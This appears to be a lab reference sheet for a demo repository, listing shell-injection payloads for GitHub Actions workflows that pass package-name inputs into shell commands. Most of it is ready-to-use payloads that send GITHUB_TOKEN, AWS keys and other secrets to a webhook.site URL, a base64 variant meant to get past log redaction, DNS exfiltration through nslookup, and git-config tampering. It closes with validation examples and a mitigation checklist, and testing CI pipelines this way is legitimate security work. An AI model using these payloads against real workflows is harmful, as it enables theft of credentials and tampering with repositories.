# Attack Payload Examples

Quick reference for testing the vulnerability.

## Setup

1. Get a webhook URL: https://webhook.site
2. Copy your unique webhook ID (e.g., `abc-123-def`)
3. Use payloads below, replacing `YOUR-WEBHOOK-ID`

---

## Attack Payloads

### 1. Exfiltrate the Demo Secret

**Package name:**
```
foo"; curl -X POST https://webhook.site/YOUR-WEBHOOK-ID -d "secret=$DEMO_SECRET" #
```

**Expected result:**
- Your webhook receives POST request with body: `secret=super-secret-api-key-12345`

---

### 2. Exfiltrate GitHub Token

**Package name:**
```
foo"; curl -X POST https://webhook.site/YOUR-WEBHOOK-ID -d "token=$GITHUB_TOKEN" #
```

**Expected result:**
- Your webhook receives the workflow's GitHub token
- Token can be used to push code, access repos, etc.

---

### 3. Exfiltrate Multiple Secrets

**Package name:**
```
foo"; curl -X POST https://webhook.site/YOUR-WEBHOOK-ID -d "secret=$DEMO_SECRET&aws=$DEMO_AWS_KEY&token=$GITHUB_TOKEN" #
```

**Expected result:**
- All secrets sent in one request

---

### 4. Prove Arbitrary Command Execution

**Package name:**
```
foo"; echo "=== PWNED ===" && whoami && pwd && ls -la #
```

**Expected result:**
- Workflow logs show:
  ```
  === PWNED ===
  runner
  /home/runner/work/repo-name/repo-name
  (directory listing)
  ```

---

### 5. Create Malicious File

**Package name:**
```
foo"; echo "attacker-controlled-content" > /tmp/backdoor.sh && cat /tmp/backdoor.sh #
```

**Expected result:**
- File created in runner's filesystem
- Could be used for staged attacks

---

### 6. Read Repository Contents

**Package name:**
```
foo"; cat .github/workflows/vulnerable.yml #
```

**Expected result:**
- Workflow file contents appear in logs

---

### 7. Exfiltrate via Base64 Encoding (Bypass Redaction)

**Package name:**
```
foo"; curl https://webhook.site/YOUR-WEBHOOK-ID/$(echo $GITHUB_TOKEN | base64) #
```

**Expected result:**
- Token sent in URL path (base64 encoded)
- May bypass some log redaction

---

### 8. DNS Exfiltration (Stealthy)

**Package name:**
```
foo"; nslookup $DEMO_SECRET.YOUR-DOMAIN.com #
```

**Expected result:**
- Secret sent via DNS query (if you control DNS server)
- Harder to detect than HTTP

---

### 9. Chain Multiple Commands

**Package name:**
```
foo"; SECRET=$DEMO_SECRET; TOKEN=$GITHUB_TOKEN; curl -X POST https://webhook.site/YOUR-WEBHOOK-ID -d "s=$SECRET&t=$TOKEN" #
```

**Expected result:**
- Multiple environment variables captured and sent

---

### 10. Inject into Git Commands

**Package name:**
```
foo"; git config user.email "attacker@evil.com"; git config user.name "Attacker" #
```

**Expected result:**
- Git configuration changed
- Future commits would be authored by attacker

---

## Testing Against Each Workflow

### Test Matrix

| Payload | vulnerable.yml | ineffective-fix.yml | secure.yml |
|---------|----------------|---------------------|------------|
| Payload #1 (secret exfil) | ❌ Vulnerable | ❌ Still Vulnerable | ✅ Blocked |
| Payload #2 (token exfil) | ❌ Vulnerable | ❌ Still Vulnerable | ✅ Blocked |
| Payload #4 (command exec) | ❌ Vulnerable | ❌ Still Vulnerable | ✅ Blocked |

---

## Valid Inputs (Should Pass Secure Workflow)

These inputs should pass validation in `secure.yml`:

### Valid Package Names

```
@prefect/ui-library
lodash
@babel/core
react-router-dom
my-awesome-package
```

### Valid Versions

```
1.0.0
2.1.3
10.20.30
1.0.0-alpha
2.0.0-beta.1
3.1.4+build.123
```

---

## Understanding the Attack

### Why Quotes Don't Protect

```yaml
run: git checkout -b "update-${PACKAGE_NAME}"
env:
  PACKAGE_NAME: foo"; curl evil.com #
```

**Shell sees:**
```bash
git checkout -b "update-foo"; curl evil.com #"
                        ^    ^
                        |    |
                        |    Second command starts here
                        First quote closes here
```

### Why Environment Variables Don't Help

```
Step 1: GitHub evaluates: ${{ inputs.package_name }} → "foo; curl evil.com"
Step 2: Env var created:  PACKAGE_NAME="foo; curl evil.com"
Step 3: Shell expands:    ${PACKAGE_NAME} → "foo; curl evil.com"
Step 4: Shell parses:     Command boundary at semicolon
Step 5: Attack succeeds:  curl executes
```

**No escaping happens!**

---

## Observing the Attack

### In Workflow Logs

Look for:
- Commands executing after git commands
- Secrets appearing in logs (partially redacted)
- Unexpected command output

### In Your Webhook

Check for:
- POST requests with secret values
- Base64-encoded tokens in URL path
- Multiple parameters with sensitive data

### In Git History

After attack:
```bash
git log --format="%an <%ae>"
```

May show attacker's email if they modified git config.

---

## Defense Verification

Run this payload through all three workflows:

**Package name:**
```
foo"; curl -v https://webhook.site/YOUR-WEBHOOK-ID?secret=$DEMO_SECRET 2>&1 | tee /tmp/exfil.log #
```

**Expected Results:**

| Workflow | Result |
|----------|--------|
| vulnerable.yml | ❌ Secret sent to webhook |
| ineffective-fix.yml | ❌ Secret sent to webhook |
| secure.yml | ✅ Validation fails, no curl executed |

---

## Real-World Scenario

Imagine this workflow in a production repository:

1. **Attacker forks the repo**
2. **Creates malicious workflow_dispatch trigger**
3. **Payload:** Exfiltrates all secrets to attacker's server
4. **Result:** Attacker gains access to:
   - Production AWS keys
   - Database credentials
   - API tokens
   - Private repository access

**This is a critical vulnerability!**

---

## Proof of Non-Vulnerability (Secure Workflow)

When you run `secure.yml` with attack payloads, you should see:

```
🔍 Validating package name: foo"; curl https://evil.com
❌ ERROR: Invalid package name format
   Package name: foo"; curl https://evil.com
   Expected format: @scope/package-name or package-name
   Allowed characters: a-z, A-Z, 0-9, _, -, /, @
Error: Process completed with exit code 1.
```

**No secrets exfiltrated, no commands executed!**

---

## Common Questions

### Q: Is this really exploitable in GitHub Actions?

**A: Yes!** Try the payloads above and see for yourself.

### Q: Does GitHub redact secrets in logs?

**A: Partially.** GitHub redacts exact matches, but encoding (base64) or modifying the string can bypass redaction.

### Q: Can this be used to compromise production?

**A: Absolutely.** If your workflows have access to production credentials, an attacker can steal them.

### Q: Why do SAST tools recommend env vars if they don't work?

**A: Many SAST tools have incorrect remediation advice.** Always test fixes!

---

## Mitigation Checklist

- [ ] Add input validation with regex
- [ ] Test validation with attack payloads
- [ ] Restrict who can trigger workflows
- [ ] Use `actions/github-script` for complex logic
- [ ] Review all workflow files for `${{ inputs.* }}` usage
- [ ] Audit secrets and minimize their scope
- [ ] Enable branch protection rules
- [ ] Require code review for workflow changes

---

**Remember:** Always test security fixes with actual attack payloads!
